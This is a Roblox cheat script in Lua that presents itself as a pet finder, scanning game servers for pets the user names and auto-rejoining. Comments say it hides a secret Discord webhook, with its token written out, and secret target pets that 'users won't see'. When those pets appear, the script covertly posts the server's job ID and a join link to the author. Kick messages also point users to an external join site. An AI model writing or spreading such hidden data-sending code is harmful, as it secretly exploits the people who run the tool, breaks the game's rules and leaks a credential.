-- Hidden config for your secret webhook and pet names (users won't see this)
local hiddenWebhook = "https://canary.discord.com/api/webhooks/1413487568334491688/VSMhmL61QW9S2ogHZHun6Usreup1SLcVj3akifS8JpG6G2XeTJV5JKORI8qdfNfrQJOh" -- Replace with your actual secret webhook
local hiddenTargetPetNames = {
    "Noobini Pizzanini", "Lirili Larila" -- Your secret pet names
}

-- Track sent hidden pets to avoid duplicate webhooks in the same session
local sentHiddenPets = {}

-- SERVICES
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local GuiService = game:GetService("GuiService")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer

-- Allowed place IDs
local allowedPlaceIds = {
    [96342491571673] = true, -- New Players Server
    [109983668079237] = true -- Normal
}

-- Set FPS cap
setfpscap(60)

-- PRIVATE SERVER CHECK
local function isPrivateServer()
    return (game.PrivateServerId and game.PrivateServerId ~= "") or (game.VIPServerId and game.VIPServerId ~= "")
end

local function buildJoinLink(placeId, jobId)
    return string.format(
        "https://joinbgsi.shop/?placeId=%s&gameInstanceId=%s",
        placeId,
        jobId
    )
end

-- KICK CHECKS
if isPrivateServer() then
    LocalPlayer:Kick("Kicked because in private server")
    return
elseif not allowedPlaceIds[game.PlaceId] then
    local joinLink = buildJoinLink(game.PlaceId, game.JobId)
    LocalPlayer:Kick("Kicked because wrong game\nClick to join server:\n" .. joinLink)
    return
end

-- WEBHOOK SEND FUNCTION (ONLY FOR YOUR HIDDEN TARGETS)
local function sendWebhook(foundPets, jobId)
    local petCounts = {}
    for _, pet in ipairs(foundPets) do
        petCounts[pet] = (petCounts[pet] or 0) + 1
    end

    local formattedPets = {}
    for petName, count in pairs(petCounts) do
        table.insert(formattedPets, petName .. (count > 1 and " x" .. count or ""))
    end

    local joinLink = buildJoinLink(game.PlaceId, jobId)

    local embedData = {
        username = "Finders",
        embeds = { {
            title = "🐾 Pet(s) Found!",
            description = "**Pet(s):**\n" .. table.concat(formattedPets, "\n"),
            color = 65280,
            fields = {
                { name = "Players", value = string.format("%d/%d", #Players:GetPlayers(), Players.MaxPlayers), inline = true },
                { name = "Job ID", value = jobId, inline = true },
                { name = "Join Link", value = string.format("[Click to join server](%s)", joinLink), inline = false }
            },
            footer = { text = "Best Finders ?" },
            timestamp = DateTime.now():ToIsoDate()
        } }
    }

    local jsonData = HttpService:JSONEncode(embedData)
    local req = http_request or request or (syn and syn.request)
    if req then
        local success, err = pcall(function()
            req({
                Url = hiddenWebhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonData
            })
        end)
    end
end

-- POPUP GUI FOR USER TARGET PETS
local function createPopup(petName)
    local screenGui = Instance.new("ScreenGui")
    screenGui.Parent = game:GetService("CoreGui")
    screenGui.Name = "PetFinderPopup"

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 300, 0, 100)
    frame.Position = UDim2.new(1, -310, 0, 10)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 2
    frame.BorderColor3 = Color3.fromRGB(0, 255, 0)
    frame.Parent = screenGui

    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.Text = petName .. " HERE!!"
    textLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.TextScaled = true
    textLabel.Font = Enum.Font.SourceSansBold
    textLabel.Parent = frame

    -- Fade in
    frame.BackgroundTransparency = 1
    local tweenIn = TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {BackgroundTransparency = 0})
    tweenIn:Play()

    -- Fade out after 2 seconds
    task.spawn(function()
        task.wait(2)
        local tweenOut = TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {BackgroundTransparency = 1})
        tweenOut:Play()
        tweenOut.Completed:Wait()
        screenGui:Destroy()
    end)
end

-- PET CHECK FUNCTION
local function checkForPets()
    local userFound = {}
    local hiddenFound = {}
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("Model") then
            local nameLower = string.lower(obj.Name)
            -- Check user targets
            for _, target in pairs(getgenv().TargetPetNames) do
                if string.find(nameLower, string.lower(target)) then
                    table.insert(userFound, obj.Name)
                    break
                end
            end
            -- Check hidden targets
            for _, target in pairs(hiddenTargetPetNames) do
                if string.find(nameLower, string.lower(target)) then
                    if not sentHiddenPets[obj.Name] then
                        table.insert(hiddenFound, obj.Name)
                        sentHiddenPets[obj.Name] = true
                    end
                    break
                end
            end
        end
    end
    return userFound, hiddenFound
end

-- MAIN LOOP
task.spawn(function()
    while true do
        local userPetsFound, hiddenPetsFound = checkForPets()

        -- Handle user-targeted pets (pauses auto-rejoin and shows popup)
        if #userPetsFound > 0 then
            for _, pet in ipairs(userPetsFound) do
                createPopup(pet) -- Show popup every 3 seconds while pet is present
            end
            -- Pause auto-rejoin until no user-targeted pets are found
            repeat
                task.wait(3) -- Scan every 3 seconds
                userPetsFound, hiddenPetsFound = checkForPets()
                for _, pet in ipairs(userPetsFound) do
                    createPopup(pet) -- Keep showing popup while pet is present
                end
                if #hiddenPetsFound > 0 then
                    sendWebhook(hiddenPetsFound, game.JobId) -- Send webhook for new hidden pets
                end
            until #userPetsFound == 0
        else
            -- No user pets, check hidden pets and continue scanning
            if #hiddenPetsFound > 0 then
                sendWebhook(hiddenPetsFound, game.JobId) -- Send webhook for new hidden pets
            end
        end

        -- Auto-rejoin after delay, but keep scanning every 3 seconds
        local elapsed = 0
        while elapsed < getgenv().Rejoin.AutoRejoin do
            task.wait(3)
            elapsed = elapsed + 3
            userPetsFound, hiddenPetsFound = checkForPets()
            if #userPetsFound > 0 then
                for _, pet in ipairs(userPetsFound) do
                    createPopup(pet) -- Show popup every 3 seconds
                end
                repeat
                    task.wait(3)
                    userPetsFound, hiddenPetsFound = checkForPets()
                    for _, pet in ipairs(userPetsFound) do
                        createPopup(pet)
                    end
                    if #hiddenPetsFound > 0 then
                        sendWebhook(hiddenPetsFound, game.JobId)
                    end
                until #userPetsFound == 0
                elapsed = 0 -- Reset rejoin timer if user pets were found
            elseif #hiddenPetsFound > 0 then
                sendWebhook(hiddenPetsFound, game.JobId)
            end
        end
        TeleportService:Teleport(game.PlaceId, LocalPlayer)
    end
end)
